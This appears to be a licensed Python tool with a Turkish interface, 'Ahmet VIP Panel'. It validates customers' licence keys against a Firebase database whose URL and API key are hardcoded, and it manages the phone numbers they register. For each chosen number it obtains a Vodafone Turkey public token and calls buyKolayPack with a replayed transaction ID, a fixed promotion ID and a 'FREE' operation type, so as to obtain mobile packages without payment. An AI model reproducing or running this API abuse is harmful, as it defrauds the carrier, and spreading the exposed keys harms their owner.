import requests
import json
import time
import sys
import os 
from datetime import datetime
from colorama import init, Fore, Style

# --- TEMA VE STİL AYARLARI ---
init(autoreset=True)
THEME_COLOR = Fore.CYAN + Style.BRIGHT
ACCENT_COLOR = Fore.YELLOW + Style.BRIGHT
ERROR_COLOR = Fore.RED + Style.BRIGHT
SUCCESS_COLOR = Fore.GREEN + Style.BRIGHT
NORMAL_COLOR = Fore.WHITE + Style.NORMAL

# --- FIREBASE BİLGİLERİ ---
FIREBASE_DATABASE_URL = "https://gbkazan-51b75-default-rtdb.firebaseio.com"
FIREBASE_API_KEY = "AIzaSyC7S-PgJVUpZ3kCmnN2lAtB5toLNqSzcqg"

# --- YENİ FONKSİYON: EKRAN TEMİZLEME ---
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# --- DEKORASYON FONKSİYONLARI ---
def print_header():
    print(THEME_COLOR + "    _   _ ____  __  __ _____ _______ ")
    print(THEME_COLOR + "   / \\ | |  _ \\|  \\/  | ____|_   _|")
    print(THEME_COLOR + "  / _ \\| | | | | |\\/| |  _|   | |  ")
    print(THEME_COLOR + " / ___ \\ | |_| | |  | | |___  | |  ")
    print(THEME_COLOR + "/_/   \\_\\_|____/|_|  |_|_____| |_|  ")
    print(THEME_COLOR + "        -- __ VIP Panel __ --\n")

def print_footer():
    print(THEME_COLOR + "\n" + "═" * 60)
    print(THEME_COLOR + f"{'-- __ Ahmet VIP __ --':^60}")
    print(THEME_COLOR + "═" * 60)

def get_db_url(path=""):
    return f"{FIREBASE_DATABASE_URL}/lisanslar/{path}.json?key={FIREBASE_API_KEY}"

# --- LİSANS VE KULLANICI FONKSİYONLARI ---
def check_license(license_key):
    """Lisansı doğrular ve lisans verisini döndürür."""
    print(ACCENT_COLOR + "Lisans durumu doğrulanıyor, lütfen bekleyin...")
    try:
        response = requests.get(get_db_url(license_key), timeout=5)
        if response.status_code != 200 or response.text == "null":
            print(ERROR_COLOR + "HATA: Geçersiz veya bulunamayan lisans anahtarı.")
            return None
        
        data = response.json()

        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            update_url = get_db_url(f"{license_key}/son_gorulme")
            requests.put(update_url, data=json.dumps(timestamp), timeout=2) 
        except Exception:
            pass 

        if data.get("durum") != "aktif":
            print(ERROR_COLOR + "Lisansınız aktif değil. Lütfen yönetici ile iletişime geçin.")
            return None
            
        bitis_tarihi = datetime.strptime(data.get("bitis_tarihi", "1970-01-01"), "%Y-%m-%d").date()
        bugun = datetime.now().date()
        
        if bugun > bitis_tarihi:
            print(ERROR_COLOR + f"Lisans süreniz {bitis_tarihi} tarihinde dolmuştur.")
            return None
        
        data['kalan_gun'] = (bitis_tarihi - bugun).days
        print(SUCCESS_COLOR + "Lisans doğrulandı.")
        return data

    except Exception:
        print(ERROR_COLOR + "Lisans sunucusuna bağlanılamadı. İnternet bağlantınızı kontrol edin.")
        return None

def show_license_info(license_data):
    clear_screen()
    print(ACCENT_COLOR + "\n--- ℹ️ LİSANS BİLGİLERİM ---" + NORMAL_COLOR)
    print(f"  Kullanıcı Adı: {THEME_COLOR}{license_data.get('kullanici_adi', 'N/A')}")
    print(f"  Bitiş Tarihi:  {THEME_COLOR}{license_data.get('bitis_tarihi', 'N/A')}")
    print(f"  Kalan Süre:    {THEME_COLOR}{license_data.get('kalan_gun', 'N/A')} gün")
    hak = license_data.get('numara_hakki', 0)
    numaralar = license_data.get('kayitli_numaralar', {})
    print(f"  Numara Hakkı:  {THEME_COLOR}{len(numaralar)} / {hak} {NORMAL_COLOR}(kullanılan/toplam)")
    print(ACCENT_COLOR + "---------------------------")

def list_phone_numbers(license_data, show_header=True):
    if show_header:
        clear_screen()
        print(ACCENT_COLOR + "\n--- 📜 KAYITLI NUMARALARIM ---" + NORMAL_COLOR)
    numaralar = license_data.get('kayitli_numaralar', {})
    if not numaralar:
        print(NORMAL_COLOR + "  Henüz kayıtlı numaranız bulunmuyor.")
        return []
    
    num_list = list(numaralar.keys())
    for i, num in enumerate(num_list):
        print(NORMAL_COLOR + f"  {i+1}. {THEME_COLOR}{num}")
    return num_list

def add_phone_number(license_key, license_data):
    clear_screen()
    print(ACCENT_COLOR + "\n--- ➕ YENİ NUMARA EKLE ---" + NORMAL_COLOR)
    numara_hakki = license_data.get("numara_hakki", 0)
    kayitli_numaralar = license_data.get("kayitli_numaralar", {})
    
    if len(kayitli_numaralar) >= numara_hakki:
        print(ERROR_COLOR + "HATA: Maksimum numara kayıt hakkınıza ulaştınız.")
        return

    while True:
        phone_number = input(ACCENT_COLOR + "  Eklenecek 5xxx numarasını girin: ").strip()
        if phone_number.startswith('5') and len(phone_number) == 10 and phone_number.isdigit():
            break
        else:
            print(ERROR_COLOR + "  Hatalı format! (örn: 5321234567)")

    if phone_number in kayitli_numaralar:
        print(ERROR_COLOR + "  Bu numara zaten listenizde kayıtlı.")
        return

    register_url = get_db_url(f"{license_key}/kayitli_numaralar/{phone_number}")
    try:
        response = requests.put(register_url, data=json.dumps("kayitli"))
        if response.status_code == 200:
            license_data.setdefault('kayitli_numaralar', {})[phone_number] = "kayitli"
            print(SUCCESS_COLOR + f"  {phone_number} başarıyla kaydedildi.")
        else:
            print(ERROR_COLOR + "  HATA: Numara kaydedilirken bir hata oluştu.")
    except Exception as e:
        print(ERROR_COLOR + f"  AĞ HATASI: Numara kaydedilemedi. {e}")

def run_number_manager(license_key, license_data):
    while True:
        clear_screen()
        print(ACCENT_COLOR + "\n--- 📱 NUMARALARIMI YÖNET ---" + NORMAL_COLOR)
        print("  1. " + NORMAL_COLOR + "➕ Yeni Numara Ekle")
        print("  2. " + NORMAL_COLOR + "📜 Numaralarımı Listele")
        print("  3. " + NORMAL_COLOR + "↩️ Ana Menüye Dön")
        
        secim = input(ACCENT_COLOR + "\n  Seçiminiz (1-3): ").strip()
        
        if secim == '1':
            add_phone_number(license_key, license_data)
        elif secim == '2':
            list_phone_numbers(license_data)
        elif secim == '3':
            break
        else:
            print(ERROR_COLOR + "  Geçersiz seçim.")
        input(NORMAL_COLOR + "\n  Devam etmek için Enter'a basın...")

def run_reward_process(license_data):
    clear_screen()
    print(ACCENT_COLOR + "\n--- 🎁 ÖDÜLÜ AL ---" + NORMAL_COLOR)
    num_list = list_phone_numbers(license_data, show_header=False)
    if not num_list:
        print(NORMAL_COLOR + "  Ödül almak için önce 'Numaralarımı Yönet' menüsünden numara eklemelisiniz.")
        return

    try:
        print(NORMAL_COLOR + "\n  Hangi kayıtlı numara için işlem yapılsın?")
        secim = int(input(ACCENT_COLOR + "  Numara sırasını girin: ").strip())
        
        if 1 <= secim <= len(num_list):
            phone_number = num_list[secim - 1]
            print(NORMAL_COLOR + f"  {THEME_COLOR}{phone_number} {NORMAL_COLOR}için işlem başlatılıyor...")
            main_program_logic(phone_number) # Ana Vodafone kodunu çağır
        else:
            print(ERROR_COLOR + "  Geçersiz seçim.")
    except ValueError:
        print(ERROR_COLOR + "  Lütfen sayısal bir değer girin.")

# --- VODAFONE API FONKSİYONLARI (SESSİZ ÇALIŞMA) ---
def get_public_token(msisdn):
    url = f"https://m.vodafone.com.tr/maltgtwaycbu/api?method=getPublicToken&msisdn={msisdn}&type=3"
    try:
        response = requests.post(url, headers={'Accept': 'application/json'}, timeout=5)
        response.raise_for_status(); return response.json().get('publicToken')
    except Exception: return None

def get_kolay_pack_identifier(public_token):
    params = {'method': 'getKolayPacks', 'publicToken': public_token}
    try:
        response = requests.post('https://m.vodafone.com.tr/maltgtwaycbu/api', params=params, headers={'Accept': 'application/json'}, timeout=5)
        response.raise_for_status(); data = response.json()
        categories = data.get('kolayPackCategory')
        if categories:
            for category in categories:
                kolay_packs = category.get('kolayPacks')
                if kolay_packs: return kolay_packs[0].get('id')
        return None
    except Exception: return None

def buy_kolay_pack(msisdn, public_token, operation_type, identifier):
    headers = {'Accept': 'application/json', 'Origin': 'https://www.vodafone.com.tr', 'Referer': 'https://www.vodafone.com.tr/'}
    params = {'method': 'buyKolayPack', 'publicToken': public_token, 'transactionId': 'DADBA38725DE9A09CA8156C8CB3E7B4EC83913F948D25B51FA4841541F802C99730C99B84FFF1844C0F7A4D7E441487D2044B66573273F420FF8A9437A14216B9A88B9053B625D3B108A1D626047166D68389F60F200CBA466277FBE9550BF57A022B85C4BDD24DE7D6E886EAD2FED91E58959E6',
              'reasonCode': '13239', 'operationType': operation_type, 'isContractApproved': 'true', 'binCode': '482465',
              'promotionId': '121', 'msisdn': msisdn, 'institutionId': '2871', 'identifier': identifier}
    try:
        response = requests.post('https://m.vodafone.com.tr/maltgtwaycbu/api', params=params, headers=headers, timeout=5)
        return response.status_code == 200
    except Exception: return False

def main_program_logic(phone_number):
    print(ACCENT_COLOR + "\n  İşlem başlatılıyor... Lütfen bekleyin.")
    print(NORMAL_COLOR + "    Adım 1: Güvenli bağlantı kuruluyor...")
    token = get_public_token(phone_number)
    if not token:
        print(ERROR_COLOR + "    HATA: Sunucuya bağlanılamadı (Adım 1).")
        return

    print(NORMAL_COLOR + "    Adım 2: Veriler doğrulanıyor...")
    identifier = get_kolay_pack_identifier(token)
    if not identifier:
        print(ERROR_COLOR + "    HATA: Gerekli veriler bulunamadı (Adım 2).")
        return

    print(NORMAL_COLOR + "    Adım 3: Talepler gönderiliyor...")
    operation_types = ['MP', 'FREE', 'MP']
    success_count = 0

    for op_type in operation_types:
        if buy_kolay_pack(phone_number, token, op_type, identifier):
            success_count += 1
        time.sleep(2) 

    print(NORMAL_COLOR + "  " + "-" * 40)
    if success_count > 0:
        print(SUCCESS_COLOR + f"  İşlem, {success_count} adet başarılı talep ile tamamlandı!")
    else:
        print(ERROR_COLOR + "  Tüm talepler başarısız oldu.")

# --- PROGRAM BAŞLANGIÇ NOKTASI ---
# (Bu script exec() ile çağrılacağı için 'if __name__ == "__main__":' bloğu
# normal bir fonksiyon gibi çalışacaktır.)
try:
    clear_screen() 
    print_header()
    
    lisans_key = input(ACCENT_COLOR + "Lütfen lisans anahtarınızı girin: ").strip()
    if not lisans_key:
        sys.exit()

    license_data = check_license(lisans_key)
    
    if license_data:
        clear_screen() 
        print_header()
        print(SUCCESS_COLOR + "\nHoş geldiniz, " + THEME_COLOR + f"{license_data.get('kullanici_adi', 'Değerli Kullanıcı')}!")
        
        while True:
            print(ACCENT_COLOR + "\n--- ANA MENÜ ---" + NORMAL_COLOR)
            print("  1. " + NORMAL_COLOR + "🎁 Ödülü Al")
            print("  2. " + NORMAL_COLOR + "📱 Numaralarımı Yönet")
            print("  3. " + NORMAL_COLOR + "ℹ️ Lisans Bilgilerim")
            print("  4. " + NORMAL_COLOR + "🚪 Çıkış Yap")
            
            secim = input(ACCENT_COLOR + "\n  Seçiminiz (1-4): ").strip()
            
            if secim == '1':
                run_reward_process(license_data)
            elif secim == '2':
                run_number_manager(lisans_key, license_data)
            elif secim == '3':
                show_license_info(license_data)
            elif secim == '4':
                break
            else:
                print(ERROR_COLOR + "  Geçersiz seçim.")
            
            input(NORMAL_COLOR + "\n  Ana menüye dönmek için Enter'a basın...")
            clear_screen() 
            print_header()
            print(SUCCESS_COLOR + "\nHoş geldiniz, " + THEME_COLOR + f"{license_data.get('kullanici_adi', 'Değerli Kullanıcı')}!")

    else:
        time.sleep(10)
        sys.exit()
    
    clear_screen()
    print_footer()
    print(NORMAL_COLOR + "\nİşlem tamamlandı. Program 15 saniye içinde kapanacak...")
    time.sleep(15)

except Exception as e:
    print(ERROR_COLOR + f"Ana programda kritik bir hata oluştu: {e}")
    time.sleep(10)